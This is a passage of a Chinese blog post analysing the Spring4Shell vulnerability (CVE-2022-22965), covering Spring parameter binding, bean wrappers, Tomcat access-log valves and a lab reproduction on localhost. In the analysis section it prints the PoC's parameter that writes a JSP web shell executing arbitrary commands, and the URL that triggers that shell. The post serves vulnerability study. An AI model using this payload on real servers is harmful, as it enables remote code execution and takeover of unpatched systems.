<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Antel0p3&#39;s blog</title>
  <meta name="author" content="John Doe">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>Antel0p3&#39;s blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2024/01/19/Spring4Shell漏洞/" >Spring4Shell漏洞(CVE-2022-22965)原理分析</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2024-01-19
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>原文：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1877/#312-suffix">https://paper.seebug.org/1877/#312-suffix</a></p>
</blockquote>
<h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><h3 id="1-1-SpringMVC参数绑定"><a href="#1-1-SpringMVC参数绑定" class="headerlink" title="1.1 SpringMVC参数绑定"></a>1.1 SpringMVC参数绑定</h3><p>为了方便编程，SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据<code>Controller</code>方法的参数，自动完成类型转换和赋值。之后，<code>Controller</code>方法就可以直接使用这些参数，避免了需要编写大量的代码从<code>HttpServletRequest</code>中获取请求数据以及类型转换。下面是一个简单的示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/addUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> String <span class="title function_">addUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Department department;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Department <span class="title function_">getDepartment</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDepartment</span><span class="params">(Department department)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.department = department;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Department</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当请求为<code>/addUser?name=test&amp;department.name=SEC</code>时，<code>public String addUser(User user)</code>中的<code>user</code>参数内容如下：</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228872000-1dtaqx.png-w331s" alt="image"></p>
<p>可以看到，<code>name</code>自动绑定到了<code>user</code>参数的<code>name</code>属性上，<code>department.name</code>自动绑定到了<code>user</code>参数的<code>department</code>属性的<code>name</code>属性上。</p>
<p>注意<code>department.name</code>这项的绑定，表明SpringMVC支持多层嵌套的参数绑定。实际上<code>department.name</code>的绑定是Spring通过如下的调用链实现的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.getDepartment()</span><br><span class="line">    Department.setName()</span><br></pre></td></tr></table></figure>

<p>假设请求参数名为<code>foo.bar.baz.qux</code>，对应<code>Controller</code>方法入参为<code>Param</code>，则有以下的调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Param.getFoo()</span><br><span class="line">    Foo.getBar()</span><br><span class="line">        Bar.getBaz()</span><br><span class="line">            Baz.setQux() <span class="comment">// 注意这里为set</span></span><br></pre></td></tr></table></figure>

<p>SpringMVC实现参数绑定的主要类和方法是<code>WebDataBinder.doBind(MutablePropertyValues)</code>。</p>
<h3 id="1-2-Java-Bean-PropertyDescriptor"><a href="#1-2-Java-Bean-PropertyDescriptor" class="headerlink" title="1.2 Java Bean PropertyDescriptor"></a>1.2 Java Bean <code>PropertyDescriptor</code></h3><p><code>PropertyDescriptor</code>是JDK自带的<code>java.beans</code>包下的类，意为属性描述器，用于获取符合Java Bean规范的对象属性和get&#x2F;set方法。下面是一个简单的例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.BeanInfo;</span><br><span class="line"><span class="keyword">import</span> java.beans.Introspector;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertyDescriptorDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanInfo</span> <span class="variable">userBeanInfo</span> <span class="operator">=</span> Introspector.getBeanInfo(User.class);</span><br><span class="line">        PropertyDescriptor[] descriptors = userBeanInfo.getPropertyDescriptors();</span><br><span class="line">        <span class="type">PropertyDescriptor</span> <span class="variable">userNameDescriptor</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor descriptor : descriptors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (descriptor.getName().equals(<span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line">                userNameDescriptor = descriptor;</span><br><span class="line">                System.out.println(<span class="string">&quot;userNameDescriptor: &quot;</span> + userNameDescriptor);</span><br><span class="line">                System.out.println(<span class="string">&quot;Before modification: &quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;user.name: &quot;</span> + userNameDescriptor.getReadMethod().invoke(user));</span><br><span class="line">                userNameDescriptor.getWriteMethod().invoke(user, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;After modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userNameDescriptor.getReadMethod().invoke(user));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">userNameDescriptor: java.beans.PropertyDescriptor[name=name; values=&#123;expert=<span class="literal">false</span>; visualUpdate=<span class="literal">false</span>; hidden=<span class="literal">false</span>; enumerationValues=[Ljava.lang.Object;@5cb9f472; required=<span class="literal">false</span>&#125;; propertyType=<span class="keyword">class</span> <span class="title class_">java</span>.lang.String; readMethod=<span class="keyword">public</span> java.lang.String cn.jidun.User.getName(); writeMethod=<span class="keyword">public</span> <span class="keyword">void</span> cn.jidun.User.setName(java.lang.String)]</span><br><span class="line">Before modification: </span><br><span class="line">user.name: foo</span><br><span class="line">After modification: </span><br><span class="line">user.name: bar</span><br></pre></td></tr></table></figure>

<p>从上述代码和输出结果可以看到，<code>PropertyDescriptor</code>实际上就是Java Bean的属性和对应get&#x2F;set方法的集合。</p>
<h3 id="1-3-Spring-BeanWrapperImpl"><a href="#1-3-Spring-BeanWrapperImpl" class="headerlink" title="1.3 Spring BeanWrapperImpl"></a>1.3 Spring <code>BeanWrapperImpl</code></h3><p>在Spring中，<code>BeanWrapper</code>接口是对Bean的包装，定义了大量可以非常方便的方法对Bean的属性进行访问和设置。</p>
<p><code>BeanWrapperImpl</code>类是<code>BeanWrapper</code>接口的默认实现，<code>BeanWrapperImpl.wrappedObject</code>属性即为被包装的Bean对象，<code>BeanWrapperImpl</code>对Bean的属性访问和设置最终调用的是<code>PropertyDescriptor</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapperImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanWrapperDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Department</span> <span class="variable">department</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Department</span>();</span><br><span class="line">        department.setName(<span class="string">&quot;SEC&quot;</span>);</span><br><span class="line">        user.setDepartment(department);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanWrapper</span> <span class="variable">userBeanWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanWrapperImpl</span>(user);</span><br><span class="line">        userBeanWrapper.setAutoGrowNestedPaths(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;userBeanWrapper: &quot;</span> + userBeanWrapper);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Before modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;user.department.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;department.name&quot;</span>));</span><br><span class="line"></span><br><span class="line">        userBeanWrapper.setPropertyValue(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        userBeanWrapper.setPropertyValue(<span class="string">&quot;department.name&quot;</span>, <span class="string">&quot;IT&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;After modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;user.department.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;department.name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">userBeanWrapper: org.springframework.beans.BeanWrapperImpl: wrapping object [cn.jidun.User@1d371b2d]</span><br><span class="line">Before modification: </span><br><span class="line">user.name: foo</span><br><span class="line">user.department.name: SEC</span><br><span class="line">After modification: </span><br><span class="line">user.name: bar</span><br><span class="line">user.department.name: IT</span><br></pre></td></tr></table></figure>

<p>从上述代码和输出结果可以看到，通过<code>BeanWrapperImpl</code>可以很方便地访问和设置Bean的属性，比直接使用<code>PropertyDescriptor</code>要简单很多。</p>
<h3 id="1-4-Tomcat-AccessLogValve-和-access-log"><a href="#1-4-Tomcat-AccessLogValve-和-access-log" class="headerlink" title="1.4 Tomcat AccessLogValve 和 access_log"></a>1.4 Tomcat <code>AccessLogValve</code> 和 <code>access_log</code></h3><p>Tomcat的<code>Valve</code>用于处理请求和响应，通过组合了多个<code>Valve</code>的<code>Pipeline</code>，来实现按次序对请求和响应进行一系列的处理。其中<code>AccessLogValve</code>用来记录访问日志access_log。Tomcat的<code>server.xml</code>中默认配置了<code>AccessLogValve</code>，所有部署在Tomcat中的Web应用均会执行该<code>Valve</code>，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;localhost_access_log&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.txt&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面列出配置中出现的几个重要属性： - directory：access_log文件输出目录。 - prefix：access_log文件名前缀。 - pattern：access_log文件内容格式。 - suffix：access_log文件名后缀。 - fileDateFormat：access_log文件名日期后缀，默认为<code>.yyyy-MM-dd</code>。</p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="2-1-复现环境"><a href="#2-1-复现环境" class="headerlink" title="2.1 复现环境"></a>2.1 复现环境</h3><ul>
<li>操作系统：Ubuntu 18</li>
<li>JDK：11.0.14</li>
<li>Tomcat：9.0.60</li>
<li>SpringBoot：2.6.3</li>
</ul>
<h3 id="2-2-复现过程"><a href="#2-2-复现过程" class="headerlink" title="2.2 复现过程"></a>2.2 复现过程</h3><ol>
<li>创建一个maven项目，pom.xml内容如下：</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>CVE-2022-22965<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>项目中添加如下代码，作为SpringBoot的启动类：</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.support.SpringBootServletInitializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationMain</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> builder.sources(ApplicationMain.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(ApplicationMain.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>将章节<code>1.1 SpringMVC参数绑定</code>中的<code>User</code>类和<code>UserController</code>类添加到项目中。</li>
<li>执行maven打包命令，将项目打包为war包，命令如下：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package</span><br></pre></td></tr></table></figure>

<ol>
<li>将项目中target目录里打包生成的<code>CVE-2022-22965-0.0.1-SNAPSHOT.war</code>，复制到Tomcat的<code>webapps</code>目录下，并启动Tomcat。</li>
<li>从 <a target="_blank" rel="noopener" href="https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py">https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py</a> 下载POC文件，执行如下命令：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py --url http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser</span><br></pre></td></tr></table></figure>

<ol>
<li>浏览器中访问<code>http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=gnome-calculator</code>，复现漏洞。</li>
</ol>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228873000-2gyffg.png-w331s" alt="image"></p>
<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="3-1-POC分析"><a href="#3-1-POC分析" class="headerlink" title="3.1 POC分析"></a>3.1 POC分析</h3><p>我们从POC入手进行分析。通过对POC中的<code>data</code> URL解码后可以拆分成如下5对参数。</p>
<h4 id="3-1-1-pattern参数"><a href="#3-1-1-pattern参数" class="headerlink" title="3.1.1 pattern参数"></a>3.1.1 <code>pattern</code>参数</h4><ul>
<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code></li>
<li>参数值：<code>%&#123;c2&#125;i if(&quot;j&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i</code></li>
</ul>
<p>很明显，这个参数是SpringMVC多层嵌套参数绑定。我们可以推测出如下的调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        ......</span><br><span class="line">            SomeClass.setPattern()</span><br></pre></td></tr></table></figure>

